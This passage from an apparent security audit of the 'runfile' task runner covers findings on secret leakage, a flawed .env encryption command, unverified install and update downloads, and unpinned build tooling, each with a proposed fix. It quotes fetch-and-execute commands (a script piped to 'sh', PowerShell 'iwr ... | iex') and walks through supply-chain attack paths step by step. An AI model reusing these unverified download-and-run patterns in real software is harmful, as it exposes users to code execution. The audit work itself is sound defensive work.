[Also reported by `runtime`] Make cleanup unconditional: (1) install handlers for SIGTERM, SIGHUP and SIGQUIT that set the same flag as SIGINT (and on Windows return TRUE for CTRL_CLOSE/LOGOFF/SHUTDOWN after setting it, giving the walker its ~5 s to clean up); (2) wrap the run in a guard whose Drop calls `cleanup_temps()` so panics unwind through it, and replace `h.join().expect(...)` with propagating an error; (3) keep SIGPIPE default for the CLI's own printing but have `relay`/`emit` treat EPIPE as a stop (ignore SIGPIPE while a target runs and map write errors to Interrupted). Optionally create temp files under a per-run 0700 directory and remove stale `runfile-<pid>-*` entries whose pid is gone at startup.

**Product impact:** none — internal change only.

*Reported independently by 2 agents: runtime.*

---

#### SA-012: Failure messages, `.logging` traces and `--dry-run` previews print the rendered command, so interpolated secrets reach stderr/stdout and CI logs

**Severity:** Medium | **Confidence:** Confirmed | **Category:** secrets | **CWE-532** | **Component:** `crates/runfile-runtime (exec.rs, run.rs) + crates/runfile-cli (main.rs)`

**Location**

`crates/runfile-runtime/src/exec.rs:397-401`

```rust
if !out.status.success() {
	return Err(ExecError::Status {
		cmd: failed_label(&program, s.command, s.body, script.is_some()),
		code: out.status.code().unwrap_or(-1),
	});
```

`crates/runfile-runtime/src/exec.rs:613-625`

```rust
fn failed_label(program: &Path, command: Option<&str>, body: &str, traced: bool) -> String {
	...
	match (lines.next(), lines.next()) {
		(Some(only), None) => format!("`{only}`"),
		(Some(_), Some(_)) if traced => "the command above".to_string(),
		(Some(first), Some(_)) => format!("a command in `{first} …`"),
```

`crates/runfile-runtime/src/exec.rs:576-577`

```rust
let said = runfile_lang::Value::Str(format!("{tag} {bold}{t}{reset}")).to_shell();
out.push_str(&format!("printf '%s\\n' {said} >&2\n"));
```

`crates/runfile-runtime/src/exec.rs:627-637`

```rust
fn announce(program: &str, body: &str) {
	...
	for line in text.lines() {
		eprintln!("{tag} {bold}{line}{reset}");
```

`crates/runfile-runtime/src/run.rs:510-511`

```rust
let (cmd, text) = render(command.as_deref(), body, r)?;
r.trace.push(text.clone());
```

`crates/runfile-cli/src/main.rs:321-322`

```rust
for line in trace.iter() {
	println!("{line}");
```

**Attack path**

Source: a secret a target interpolates into a command -- `{{ ENV.X }}` where X is an `encrypted:` `.env-file` value that runfile-env decrypts in memory (build_env), a `decrypt()`/`read_file()` result, or a CI-provided variable. `render()` (run.rs:858-877) splices the value into the body text. That rendered text then reaches three sinks: (1) on ANY non-zero exit, with no opt-in, `failed_label(..., s.body, ...)` (exec.rs:399, 613-625) quotes the first rendered line into ExecError::Status, which the CLI prints as `[runfile] error: `...` exited with status N` (also printed by `code_of(run ...)` via run.rs:802); (2) with `.logging`, `traced()` emits `printf '%s\n' '<rendered line>' >&2` before each line (exec.rs:576-577) and `announce()` prints whole rendered bodies (exec.rs:627-637); (3) under `--dry-run` the rendered text is pushed to the trace (run.rs:511) and printed to stdout (main.rs:321-322), after env-building has already decrypted `.env-file` values. Reproduced with a stand-in value FAKE_TOKEN=tok_FAKE_0123456789: `$ false {{ ENV.FAKE_TOKEN }}` printed `[runfile] error: `false tok_FAKE_0123456789` exited with status 1`; a multi-line block printed `a command in `test -z tok_FAKE_0123456789 ...``; `.logging` printed `[runfile] echo second tok_FAKE_0123456789`; `--dry-run` printed `echo deploying with tok_FAKE_0123456789`.

**Why existing controls don't stop it**

The only redaction in the crate is Debug impls (env.rs:58-70 prints Inherited names only; Keys hides the pool) -- neither covers these paths. failed_label, traced, announce and the dry-run trace all take the rendered body; nothing keeps the source form or a list of secret values. `.logging` is opt-in, but the failure-message path is not. A command that lets the shell expand `$TOKEN` at run time does not leak (the text shows `$TOKEN`), so exposure is limited to targets that interpolate a secret with `{{ }}` -- which the docs present as the safe, self-quoting way to put a value on a command line. Values runfile decrypts itself are produced inside the process, so a CI system's own masking (which works from the secrets it injected) has nothing to match them against.

**Impact**

Credentials (deploy tokens, API keys, database passwords) written into terminal scrollback, CI job logs and log aggregation whenever such a command fails (network flake, bad version) -- a common event, not an attacker-chosen one -- and into every `.logging` run and `--dry-run` preview. For a public repository's CI (e.g. the public GitHub mirror, or any consumer of the setup action), job logs are readable by anyone.

**Fix**

Keep a display form separate from the executed form. Have `render()` return (text_to_run, text_to_show) where text_to_show keeps literal parts and replaces each interpolation by its source (`{{ ENV.TOKEN }}`); add a `display: &str` field to `Spawn` and use it in `traced`, `announce`, `failed_label` and `r.trace.push`. If values must be shown (dry-run), redact known secrets: record every plaintext produced by `.env-file` decryption and `decrypt()` in a shared `Scope` set and replace occurrences with `***` in every runner-authored message.

**⚠ Product impact**

*Type:* `ux`

Error messages, `.logging` lines and `--dry-run` output would show `{{ ENV.TOKEN }}` (or `***`) instead of the concrete value; people who read the preview to see exact arguments lose that.

*Safer rollout:* Show the source form by default and offer an explicit opt-in (e.g. `--dry-run --show-values`) that still masks values known to come from decryption.

---

#### SA-013: `run :env encrypt` copies the body of a multi-line value (PEM key, certificate) into the 'encrypted' output in plaintext, and silently changes quoted or commented values

**Severity:** Medium | **Confidence:** Confirmed | **Category:** secrets | **CWE-312** | **Component:** `crates/runfile-cli (:env)`

**Location**

`crates/runfile-cli/src/cmd_env/crypt.rs:149-186`

```rust
for line in content.lines() {
	let trimmed = line.trim();
	...
	if let Some(eq_pos) = trimmed.find('=') {
		let key_part = &trimmed[..eq_pos];
		let val_part = &trimmed[eq_pos + 1..];
		...
		match runfile_crypto::encrypt(val_part.trim(), &key_hex) {
	...
	} else {
		out_lines.push(line.to_string());
	}
```

`crates/runfile-cli/src/cmd_env/crypt.rs:193-198`

```rust
if let Err(e) = std::fs::write(output, &out_content) { ... }
println!("Encrypted {source} -> {output}");
```

`crates/runfile-env/src/parse.rs:54-81`

```rust
if (raw_value.starts_with('"') && find_closing_quote(&raw_value[1..], '"').is_none()) ... { // multi-line quoted value
```

**Attack path**

No attacker needed. The supported way to move an existing plaintext .env to encryption is `run :env encrypt <src> <dst> <key-prefix>`, and the encrypted result is meant to be committed. The runfile .env parser accepts multi-line quoted values (parse.rs:54-90), which is how PEM keys and certificates are written, but cmd_encrypt_file does not use it: it re-reads the file line by line, encrypts the text after the first `=` of each line, and copies every line without `=` verbatim. Reproduced: a source with `SIGNING_KEY="-----BEGIN PRIVATE KEY-----` followed by three (fake) key lines and `-----END PRIVATE KEY-----"` produced an output whose first line of the value was encrypted (`SIGNING_KEY=encrypted:...`, quote included), the key-material lines copied in plaintext, a line ending in `==` split into a bogus variable and 'encrypted', and the END line in plaintext -- while the command printed `Encrypted plain.env -> encrypted.env` and exited 0. The same line-based re-implementation makes quotes and inline comments part of the secret: `API_URL="https://api.example.test" # prod` decrypts as `"https://api.example.test" # prod`, `TOKEN=tok_FAKE_abc123 # rotate monthly` as `tok_FAKE_abc123 # rotate monthly` (checked with `:env get`). The output with plaintext lines then fails to parse at first use, and the parse error prints the plaintext key line again (separate finding).

**Why existing controls don't stop it**

The real parser (runfile_env::parse_env_file) exists and is not used here; nothing re-parses or decrypt-verifies the output before reporting success; no warning is printed for lines that are not KEY=VALUE. The source file is left in place, so nothing is lost -- the problem is what the new file exposes.

**Impact**

Private keys, certificates and other multi-line credentials end up in plaintext in a file presented as encrypted and intended for version control, often a public repository; git history keeps them after the mistake is found. Quoted or commented single-line secrets are silently changed. Requires the user's own action, but on the documented path and with very common data: medium.

**Fix**

Build the output from `runfile_env::parse_env_file(&content)`: encrypt each parsed value and write `KEY=encrypted:...` per pair (carry comments across by line number, or drop them with a notice). After writing, re-parse the output and check that every value decrypts to the parsed plaintext; on any mismatch, or any source line not accounted for by a pair, delete the output and fail.

**⚠ Product impact**

*Type:* `behavior`

Quoted values and values with trailing comments get encrypted as the value the runtime actually read before encryption (without quotes/comment), which changes what such files decrypt to compared with files produced by 1.8.2.

*Safer rollout:* Release note asking users to re-check files produced by `:env encrypt` from sources with quoted, commented or multi-line values; `:env rotate` cannot repair them since the damage is in the plaintext.

---

#### SA-014: No install or update path verifies what it downloads: installers, `run :update` and the setup action execute release assets with no signature or checksum check, and the default (Gitea) channel's assets stay mutable after publication

**Severity:** Medium | **Confidence:** Confirmed | **Category:** supply-chain | **CWE-494** | **Component:** `distribution: .cicd/release-assets/install.{sh,ps1}, crates/runfile-cli/src/cmd_update.rs, .github/actions/setup/action.yml`

**Location**

`.cicd/release-assets/install.sh:51-56`

```bash
curl -fsSL "$releases/download/$VERSION/$archive" -o "$tmp/$archive"
tar -xJf "$tmp/$archive" -C "$tmp"

mkdir -p "$INSTALL_DIR"
mv "$tmp/runfile-cli-${target}/run" "$INSTALL_DIR/run"
chmod +x "$INSTALL_DIR/run"
```

`.cicd/release-assets/install.ps1:52-53`

```
Invoke-WebRequest -Uri $url -OutFile (Join-Path $tmp $archive) -UseBasicParsing
Expand-Archive -Path (Join-Path $tmp $archive) -DestinationPath $tmp
```

`crates/runfile-cli/src/cmd_update.rs:547-564`

```rust
let script = fetch(&channel.asset(tag, "install.sh"))?;
...
let mut sh = Command::new("sh")
	.args(["-s", "--", tag])
...
let _ = sh.stdin.take().expect("stdin is piped").write_all(&script);
```

`crates/runfile-cli/src/cmd_update.rs:528-534`

```rust
let url = channel.asset(tag, "install.ps1");
let ps_cmd = format!(
	"$c=(iwr '{url}' -UseBasicParsing).Content; \
	 if($c -is [byte[]]){{$c=[Text.Encoding]::UTF8.GetString($c)}}; iex $c"
);
Command::new("powershell")
```

`.github/actions/setup/action.yml:80-94`

```yaml
if [ "$VERSION" = "latest" ]; then
  url="https://github.com/JoaaoVerona/runfile/releases/latest/download/${archive}"
...
curl -fsSL "$url" -o "$RUNNER_TEMP/$archive"
...
  tar -xJf "$RUNNER_TEMP/$archive" -C "$RUNNER_TEMP"
```

`.github/workflows/release.yml:262-264`

```yaml
- name: Generate checksums
  working-directory: dist
  run: sha256sum * > sha256.sum
```

`.cicd/release.yml:238-245`

```yaml
- name: Publish release
  uses: https://git.joaoverona.com/joaaoverona/shared-actions/gitea-release@v1
  with:
    ...
    assets: dist/*
    checksums: sha256.sum
```

**Attack path**

The default channel for the README one-liners (README.md:51,57) and for every `run :update` (Channel::Gitea is the default, cmd_update.rs:126) is the single self-hosted Gitea instance git.joaoverona.com. Gitea release attachments can be deleted and re-uploaded after publication through the API (DELETE/POST /repos/{owner}/{repo}/releases/{id}/assets), by the owner's account or any token with write on releases -- which includes the Actions job token of every Gitea CI/release job in the default permissive mode (separate finding). Step by step: (1) an attacker who obtains any such write path (instance or host compromise, the owner's Gitea session/PAT, or code running in a Gitea Actions job) replaces install.sh / install.ps1 and/or the runfile-cli-* archives of the newest Gitea release (or of the tag `latest` resolves to); (2) every new `curl ... | sh` / `irm ... | iex` install runs the attacker's script; (3) every `run :update` on Unix fetches that release's install.sh into memory and pipes it to `sh -s -- <tag>`, and on Windows `iex`es that release's install.ps1 -- no step checks a signature, and the sha256.sum both releases publish (generated by the same pipeline, hosted beside the files) is consumed by nothing; (4) the post-install check in cmd_update.rs:336-343 merely executes the new binary's `--version`, i.e. runs the attacker's code rather than detecting it.

**Why existing controls don't stop it**

HTTPS to fixed https:// URLs stops a network attacker only. GitHub-mirror releases are immutable (API `immutable: true` on v1.8.0; GitHub locks assets and the tag and generates a release attestation), so the GitHub channel and the setup action cannot be swapped after publication -- but nothing (installers, action, :update) verifies the attestation or the per-asset digests either, and the GitHub channel is opt-in except for the setup action. npm publishes via trusted publishing with SLSA provenance (registry shows `_npmUser: GitHub Actions` and an attestations URL for 1.8.0), and npm verifies the tarball's sha512, so the npm channel is the one channel with provenance. Spot check: the published GitHub v1.8.0 install.sh/install.ps1 digests (ee536205.../1f2ad0af...) equal the repository copies at HEAD. There is no equivalent of immutability on Gitea, and the Gitea instance's own configuration is not visible from the repository.

**Impact**

Code execution as the installing user on every machine that installs from the README one-liners or runs `run :update` (the auto-update path for all standalone installs) while a tampered asset is published -- the binary is a task runner that is subsequently run in developers' repositories and CI, so it also sits in front of their secrets.

**Fix**

Introduce a signing key that does not live on the Gitea host or the fleet runners (e.g. a minisign/age-style Ed25519 key kept offline or in a hardware token, used by the owner to sign `sha256.sum` after both builds finish, or Sigstore keyless signing from the GitHub release job). Embed the public key in the `run` binary and make `:update` stop executing the release's own installer: download `sha256.sum` + its signature + the archive, verify, then unpack and rename into place in Rust (or verify install.sh against the signed sum before piping it to sh). Make install.sh/install.ps1 verify the archive against the signed (or at least the published) sha256.sum before extracting. In the setup action, check the archive against the release asset's GitHub `digest` or run `gh release verify-asset`/`gh attestation verify`, which immutable releases already make possible. Consider making the GitHub (immutable, attested) channel the default for `:update` until Gitea releases can be verified.

**⚠ Product impact**

*Type:* `behavior`

Updates and installs would fail closed when a signature/checksum is missing or wrong, including for releases cut before signing existed; the owner gains a key to manage and a signing step in every release.

*Safer rollout:* Ship verification in the binary first while still accepting unsigned releases with a warning for one or two releases, then enforce; document the key and a rotation procedure.

**References**

- https://docs.gitea.com/api/operations/repo-delete-release-attachment/ — Gitea API deletes a release attachment after publication (retrieved 2026-10-03)
- https://api.github.com/repos/JoaaoVerona/runfile/releases/latest — v1.8.0: immutable=true; assets include sha256.sum; per-asset sha256 digests (retrieved 2026-10-03)
- https://docs.github.com/en/code-security/supply-chain-security/understanding-your-software-supply-chain/immutable-releases — immutable releases lock assets and tag and create a release attestation (retrieved 2026-10-03)
- https://registry.npmjs.org/@runfile/cli — latest 1.8.0 published by GitHub Actions via trusted publishing with SLSA v1 provenance attestation (retrieved 2026-10-03)

---

#### SA-015: Released VS Code extension (.vsix) is built by an unpinned `npx @vscode/vsce` resolved fresh from npm at release time, outside the lockfile

**Severity:** Medium | **Confidence:** Confirmed | **Category:** supply-chain | **CWE-829** | **Component:** `release pipeline (.cicd/release.yml, .github/workflows/release.yml) / editors/vscode`

**Location**

`editors/vscode/runfiles/package.run:7`

```
$ npx @vscode/vsce package --no-dependencies --out {{ ARG.out ? "runfile-vscode.vsix" }}
```

`.cicd/release.yml:191-197`

```yaml
      - name: Install extension dependencies
        run: run vscode:setup

      - name: Compile and package extension
        run: run vscode:package --out="runfile-vscode-${TAG#v}.vsix"
```

`.github/workflows/release.yml:216-222`

```yaml
      - name: Install extension dependencies
        run: run vscode:setup

      - name: Compile and package extension
        run: run vscode:package --out=runfile-vscode-${TAG#v}.vsix
```

`editors/vscode/package.json:252-258`

```json
"devDependencies": {
	"@types/node": "^20.0.0",
	"@types/vscode": "^1.85.0",
	"typescript": "^5.4.0",
	"vscode-oniguruma": "^2.0.1",
	"vscode-textmate": "^9.3.2"
}
```

`editors/vscode/package.json:252-258`

```json
"devDependencies": {
	"@types/node": "^20.0.0",
	"@types/vscode": "^1.85.0",
	"typescript": "^5.4.0",
	"vscode-oniguruma": "^2.0.1",
	"vscode-textmate": "^9.3.2"
}   <- no @vscode/vsce, so pnpm-lock.yaml has no entry for it
```

`.cicd/release.yml:191-204`

```yaml
- name: Install extension dependencies
  run: run vscode:setup
- name: Compile and package extension
  run: run vscode:package --out="runfile-vscode-${TAG#v}.vsix"
```

`.cicd/release.yml:238-245`

```yaml
uses: .../gitea-release@v1
  assets: dist/*
  checksums: sha256.sum
```

`.github/workflows/release.yml:216-229`

```yaml
run: run vscode:setup
...
run: run vscode:package --out=runfile-vscode-${TAG#v}.vsix
```

`.github/workflows/release.yml:262-264`

```yaml
- name: Generate checksums
  working-directory: dist
  run: sha256sum * > sha256.sum
```

`.cicd/ci.yml:141-142`

```yaml
- name: Compile and package extension
  run: run vscode:package
```

`.cicd/release.yml:191-195`

```yaml
        run: run vscode:setup

      - name: Compile and package extension
        run: run vscode:package --out="runfile-vscode-${TAG#v}.vsix"
```

`.github/workflows/release.yml:216-220`

```yaml
        run: run vscode:setup

      - name: Compile and package extension
        run: run vscode:package --out=runfile-vscode-${TAG#v}.vsix
```

**Attack path**

Both release workflows install the extension's dependencies with `pnpm install --frozen-lockfile` (vscode:setup) and then run `run vscode:package`, whose only packaging step is `npx @vscode/vsce package`. `@vscode/vsce` is not a devDependency (package.json:252-258) and is absent from editors/vscode/pnpm-lock.yaml and node_modules/.bin (checked), so npx resolves the current `latest` @vscode/vsce (4.0.0 on 2026-10-03, 26 direct dependencies all on caret ranges, including @azure/identity, @napi-rs/keyring and @vscode/vsce-sign, whose `postinstall: node ./src/postinstall.js` runs at install) and its whole transitive tree from the public registry at release time, with no lockfile and no integrity pinning. In CI npm assumes `--yes` (non-TTY / CI detected), so nothing stops it. Step by step: (1) any one package in that tree is compromised on npm (account takeover / worm, as in the 2025 npm worm incidents) or a new malicious version satisfies a caret range; (2) the owner cuts a release (`run release` -> Gitea release.yml `extension` job; `run mirror` -> GitHub release.yml `extension` job); (3) the malicious install script or module runs inside the job that produces `runfile-vscode-<version>.vsix`, and can modify the .vsix contents (extension.js) or vsce itself; (4) the tampered .vsix is uploaded as a release asset on both forges; README.md:1104 tells users to install the extension from the release .vsix. On Gitea the same step also runs with the job token and actions/checkout's persisted credentials in reach (see the separate Gitea job-token finding), so it can also rewrite other release assets.

[Also reported by `dependencies`] `run vscode:setup` installs the extension's devDependencies with `pnpm install --frozen-lockfile`, but `run vscode:package` then calls `npx @vscode/vsce`, a package that is not a devDependency and not in pnpm-lock.yaml. npx (npm exec) therefore resolves `@vscode/vsce@latest` and its whole transitive graph from the registry at build time; in CI it auto-confirms the install prompt. Live lookup 2026-10-03: latest is 4.0.0 (published 2026-09-14), 26 direct dependencies, 136 resolved packages per deps.dev, including install-time code (`@vscode/vsce-sign@2.1.0` postinstall) and native binaries (`@napi-rs/keyring-*`, `@vscode/vsce-sign-*`). This runs in the `extension` job of .cicd/release.yml (tag push) and .github/workflows/release.yml (mirror push); the .vsix it writes is uploaded, attached to the Gitea and GitHub releases, and only then hashed into sha256.sum. A malicious version of any of those 136 packages that is current at the moment of a release executes inside the packaging step and can rewrite out/extension.js before it is zipped; the published checksum then attests the tampered file. The extension runs in every user's VS Code extension host with the user's privileges (it already spawns `run` and shell commands), so a trojaned build is code execution on every machine that installs that release's .vsix. Unlike every other dependency in the repo (Cargo.lock with =pins and --locked; pnpm --frozen-lockfile), nothing here pins a version or an integrity hash, so a new malicious publish needs no further step to reach a release. Developer machines are exposed the same way (local npx cache currently holds 4.0.0).

[Also reported by `editors`] Both release workflows install the extension's dependencies with `pnpm install --frozen-lockfile` (setup.run) and then run package.run, which calls `npx @vscode/vsce`. @vscode/vsce is not a devDependency and not in pnpm-lock.yaml (grep finds no 'vsce' there; node_modules/.bin holds only node/tsc/tsserver), so npx installs it into the npm cache from the registry with no version specifier and no integrity pin; in a CI environment npx assumes --yes. Whatever @vscode/vsce version -- and transitive dependency tree -- the registry serves at release time runs inside the release job, reads the extension directory and writes the .vsix that both forges attach to the release. CI (ci.yml on both forges) does the same on every push and PR.

**Why existing controls don't stop it**

The rest of the extension toolchain is pinned by pnpm-lock.yaml and installed with --frozen-lockfile, but npx bypasses pnpm and the lockfile entirely. npm exec only prompts on a TTY; it assumes --yes in CI. No checksum/signature of the .vsix is verified by anything downstream (the release sha256.sum is computed from whatever the job produced). pnpm's build-script allow-list (pnpm 10+) does not apply because npm, not pnpm, installs vsce. The .vsix is not signed for the Marketplace. Git history shows vsce was never pinned (`pnpm dlx @vscode/vsce` before commit 1b25fc5, `npx` since).

[Also reported by `dependencies`] OSV querybatch over all 136 resolved nodes of @vscode/vsce@4.0.0 returned no advisories today, and the vsce-sign postinstall was read (copies a platform binary from its optionalDependency, falls back to the npm registry) and is benign, so nothing is exploitable right now; the risk is the absence of pinning. `--no-dependencies` and .vscodeignore (`node_modules/**`) keep vsce's own dependencies out of the .vsix, so the exposure is build-time code execution, not shipped dependency code. The Gitea extension job references no secrets; actions/checkout persists the job token in .git/config by default (not verified further here; CI agent's scope). sha256.sum is generated after packaging, so it does not detect tampering.

[Also reported by `editors`] Every other JS dependency of the extension is locked (frozen lockfile). Nothing pins or verifies vsce. The npm publish job (id-token: write) is a separate job and does not run vsce, so OIDC publishing is not directly exposed; the GitHub `extension` job declares no permissions block, so it holds the repository's default GITHUB_TOKEN permissions, and actions/checkout persists that token in .git/config by default (not verified what the repository default is). Exploitation needs a malicious @vscode/vsce or dependency version to be live on npm during a release -- the pattern of the 2025 npm compromises -- which is why this is rated low rather than higher.

**Impact**

Code execution inside VS Code (user privileges, full filesystem/network) for every user who installs the extension from a release produced while any package in vsce's unpinned tree is malicious; the attacker's code also runs in both release jobs.

[Also reported by `dependencies`] Integrity of the published VS Code extension (.vsix on Gitea and GitHub releases) rests on whatever 136 npm packages are current at release time. A single compromised publish among them during a release window yields code execution on the release runner and a backdoored extension delivered to users, signed off by the project's own checksums.

[Also reported by `editors`] A compromised vsce release (or dependency) at release time could alter the shipped extension, which then runs in every user's VS Code with their privileges, and could read the job's token. The window is any release or CI run, not a one-off.

**Fix**

Add `@vscode/vsce` as an exact-version devDependency in editors/vscode/package.json (e.g. "@vscode/vsce": "4.0.0"), run `pnpm install` once to pin its tree (with integrity hashes) in pnpm-lock.yaml, and change package.run to call the local binary: `$ vsce package --no-dependencies --out {{ ARG.out ? "runfile-vscode.vsix" }}` (node_modules/.bin is already on PATH via editors/vscode/runfiles/_shared.run `.add-path`). Leave @vscode/vsce-sign's postinstall out of pnpm's allowBuilds unless packaging needs it (it is only for Marketplace signing). Optionally add `--ignore-scripts`-style hardening and produce a signature/attestation for the .vsix (see the release-integrity finding).

[Also reported by `dependencies`] Make vsce a locked devDependency and stop using npx for it: add `"@vscode/vsce": "4.0.0"` (exact) to editors/vscode/package.json devDependencies, run `pnpm install` once to record it (and its integrity hashes) in pnpm-lock.yaml, and change package.run to `$ vsce package --no-dependencies --out {{ ARG.out ? "runfile-vscode.vsix" }}` (editors/vscode/runfiles/_shared.run already puts node_modules/.bin on PATH). pnpm 12 blocks dependency lifecycle scripts by default, so `@vscode/vsce-sign`'s postinstall will not run; packaging does not need vsce-sign, but if a `vsce` command that signs is ever used, approve it explicitly with `allowBuilds` in a pnpm-workspace.yaml as editors/tree-sitter does. Not semver-breaking for anything shipped: the .vsix content is unchanged.

[Also reported by `editors`] Add "@vscode/vsce" as an exact-pinned devDependency (it then lands in pnpm-lock.yaml with an integrity hash and in node_modules/.bin via _shared.run's .add-path), and call it as `vsce package --no-dependencies --out …` instead of `npx @vscode/vsce`; or at minimum `npx --no-install`/`npm exec --no` so a missing tool fails instead of being fetched. Give the GitHub `extension` job `permissions: contents: read` explicitly.

**Product impact:** none — internal change only.

**References**

- https://docs.npmjs.com/cli/v11/commands/npm-exec — "When standard input is not a TTY or a CI environment is detected, --yes is assumed." (retrieved 2026-10-03)
- https://registry.npmjs.org/@vscode/vsce/latest — latest = 4.0.0, 26 caret-range dependencies (retrieved 2026-10-03)
- https://registry.npmjs.org/@vscode/vsce-sign/latest — 2.1.0 has postinstall: node ./src/postinstall.js (retrieved 2026-10-03)
- https://registry.npmjs.org/@vscode%2Fvsce — dist-tags latest=4.0.0 (2026-09-14), next=4.0.1-2; 26 direct dependencies (retrieved 2026-10-03)
- https://api.deps.dev/v3/systems/npm/packages/%40vscode%2Fvsce/versions/4.0.0:dependencies — 136 resolved nodes in the dependency graph (retrieved 2026-10-03)
- https://api.osv.dev/v1/querybatch — no advisories for any of the 136 resolved nodes today (retrieved 2026-10-03)
- https://cdn.jsdelivr.net/npm/@vscode/vsce-sign@2.1.0/src/postinstall.js — install-time script in the graph (benign) (retrieved 2026-10-03)
- https://docs.npmjs.com/cli/commands/npm-exec — npx installs missing packages, assuming --yes when stdin is not a TTY or in CI (retrieved 2026-10-03)
- https://docs.npmjs.com/cli/v11/commands/npx — npx installs packages not present in local project dependencies into the npm cache (retrieved 2026-10-03)

*Reported independently by 3 agents: dependencies, editors, supply-chain-ci.*

---

#### SA-016: Third-party action actions-rust-lang/setup-rust-toolchain is pinned by a mutable tag (v1.16.1, not an immutable release) and runs inside every job that builds the released binaries on both forges

**Severity:** Medium | **Confidence:** Confirmed | **Category:** supply-chain | **CWE-829** | **Component:** `.github/workflows/release.yml (build, extension), .cicd/release.yml via shared-actions/rust-toolchain-and-cache@v1, all CI`

**Location**

`.github/workflows/release.yml:120-125`

```yaml
      - name: Install pinned Rust toolchain
        uses: actions-rust-lang/setup-rust-toolchain@v1.16.1
        with:
          cache: false
          rustflags: ""
          target: ${{ matrix.platform.target }}
```

`.github/workflows/release.yml:202-205`

```yaml
      - name: Install pinned Rust toolchain
        uses: actions-rust-lang/setup-rust-toolchain@v1.16.1
        with:
          rustflags: ""
```

`.cicd/release.yml:89-94`

```yaml
      - name: Rust toolchain
        uses: https://git.joaoverona.com/joaaoverona/shared-actions/rust-toolchain-and-cache@v1
        with:
          cache: false
          target: ${{ matrix.platform.target }}
```

`(outside repo) shared-actions/rust-toolchain-and-cache/action.yml @ local clone 0793d4f:98-99`

```
    - name: Install pinned Rust toolchain
      uses: actions-rust-lang/setup-rust-toolchain@v1.16.1
```

`.github/workflows/ci.yml:23-24, 64-65, 92-93`

```yaml
uses: actions-rust-lang/setup-rust-toolchain@v1.16.1
```

**Attack path**

Attacker: whoever gains write access to the actions-rust-lang/setup-rust-toolchain repository (maintainer account or token compromise, as with tj-actions/changed-files, CVE-2025-30066). Steps: (1) they move the v1.16.1 tag to a commit whose action.yml adds a step (the tag is an ordinary lightweight-movable tag: the GitHub API reports `immutable: false` for the v1.16.1 release today); (2) the next mirror push of a release runs .github/workflows/release.yml, whose six `build` legs and `extension` job execute the action before compiling; on Gitea every job, including the six default-channel release legs, executes it through the owner's shared-actions/rust-toolchain-and-cache@v1, which nests the same tag (act_runner fetches it from github.com, DEFAULT_ACTIONS_URL); (3) the injected step runs as the job user in the same workspace, before `run ci:build`, and can export RUSTFLAGS/RUSTC_WRAPPER through GITHUB_ENV or patch the toolchain, so the archive uploaded as the build artifact contains attacker code; (4) on GitHub that artifact becomes the release asset the setup action downloads for every consumer and the binary inside @runfile/cli, published by the npm job with valid SLSA provenance (provenance attests which workflow built it, not that the build was clean); on Gitea it becomes the default-channel archive. On Gitea the injected step additionally has the job token (see the job-token finding).

**Why existing controls don't stop it**

GitHub's immutable releases protect runfile's own releases after publication, not the build that produces them. The action pins its own nested Swatinem/rust-cache by SHA (c19371144df3bb44fab255c43d04cbc2ab54d1c4, read from action.yml at 46268bd), so the exposure is the outer tag only. The release `build` job holds only the default read-only token (personal-account repository) and the jobs with contents: write or id-token: write (release, major-tag, npm) use only GitHub-owned actions, so a moved tag cannot move `v1` or publish to npm directly; it reaches users through the artifact instead. pnpm/setup@v2.1.0 is the other third-party action in use and its release is immutable (`immutable: true`), so its tag cannot move. actions/checkout@v6.0.2, upload-artifact@v4.6.2, download-artifact@v5.0.0 and setup-node@v6.4.0 are GitHub-owned and also tag-pinned with non-immutable releases (lower risk, same fix). OSV lists no advisory for setup-rust-toolchain 1.16.1 (or any action used here) today; nothing suggests the tag has moved: it resolves to 46268bd060767258de96ed93c1251119784f2ab6.

**Impact**

A single upstream account compromise yields backdoored `run` binaries on every distribution channel at once: GitHub release archives (setup action consumers, `--channel=github`), the npm package with provenance, and, through the Gitea fleet, the default channel. Code execution on users' machines and in consumers' CI.

**Fix**

Pin by full commit SHA with the tag as a comment, in this repository and in shared-actions/rust-toolchain-and-cache/action.yml: `uses: actions-rust-lang/setup-rust-toolchain@46268bd060767258de96ed93c1251119784f2ab6 # v1.16.1`. Do the same for the GitHub-owned actions (checkout de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2; upload-artifact ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2; download-artifact 634f93cb2916e3fdff6788551b99b062d0335ce0 # v5.0.0; setup-node 48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0; pnpm/setup may stay on v2.1.0 because that release is immutable, or use 703c52620218391530e48b9e8870d5c0082e1b9b). Let Dependabot/Renovate bump the SHAs. Alternatively drop the action from release jobs: the runners already have rustup, and `rustup show` in the checkout installs the toolchain rust-toolchain.toml names.

**Product impact:** none — internal change only.

**References**

- https://api.github.com/repos/actions-rust-lang/setup-rust-toolchain/releases/tags/v1.16.1 — immutable=false; tag v1.16.1 -> commit 46268bd060767258de96ed93c1251119784f2ab6 (retrieved 2026-10-03)
- https://raw.githubusercontent.com/actions-rust-lang/setup-rust-toolchain/46268bd060767258de96ed93c1251119784f2ab6/action.yml — nested Swatinem/rust-cache pinned by SHA (v2.9.1); installs via rustup (retrieved 2026-10-03)
- https://api.github.com/repos/pnpm/setup/releases/tags/v2.1.0 — immutable=true (tag cannot be moved); annotated tag ce3b1e5 -> commit 703c526 (retrieved 2026-10-03)
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions — "Pinning an action to a full-length commit SHA is currently the only way to use an action as an immutable release"; a tag can be moved or deleted (retrieved 2026-10-03)
- https://osv.dev/vulnerability/GHSA-mrrh-fwg8-r2c3 — tj-actions/changed-files tag-move compromise, CVE-2025-30066 (precedent) (retrieved 2026-10-03)
- https://api.osv.dev/v1/querybatch — GitHub Actions ecosystem: no advisories for the seven actions/versions used (retrieved 2026-10-03)

---

#### SA-017: On Linux without a usable Secret Service, `:env init`, `:env rotate` and `:env secret-keys add` keep the only copy of a newly generated private key in kernel keyutils, which a reboot (or a few days logged out) erases

**Severity:** Medium | **Confidence:** Likely | **Category:** data-loss | **CWE-1188** | **Component:** `crates/runfile-state`

**Location**

`crates/runfile-state/src/keyring_store.rs:11-16`

```rust
//! - **Linux**: the D-Bus Secret Service (gnome-keyring / KWallet, persistent)
//!   when a session bus + provider are available; otherwise the kernel
//!   keyutils store (in-memory, cleared on reboot) as a non-persistent
//!   fallback. The choice is made once per process and **never errors**
```

`crates/runfile-state/src/keyring_store.rs:43-53`

```rust
*BACKEND.get_or_init(|| {
	if super::secret_service_store::is_usable() {
		LinuxBackend::SecretService
	} else {
		LinuxBackend::Keyutils
	}
})
```

